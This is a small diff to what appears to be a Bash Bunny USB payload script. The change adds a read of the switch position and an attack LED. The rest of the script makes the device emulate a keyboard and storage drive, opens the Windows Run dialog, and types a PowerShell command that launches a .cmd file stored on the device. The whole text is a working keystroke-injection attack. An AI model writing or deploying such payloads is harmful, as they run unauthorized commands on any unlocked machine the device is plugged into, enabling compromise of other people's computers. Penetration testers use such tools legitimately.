@@ -12,10 +12,11 @@
 #
 
 LED SETUP
+GET SWITCH_POSITION
+LED ATTACK
 ATTACKMODE HID STORAGE
 QUACK GUI r
 QUACK DELAY 100
 QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
 QUACK ENTER
-
 LED FINISH
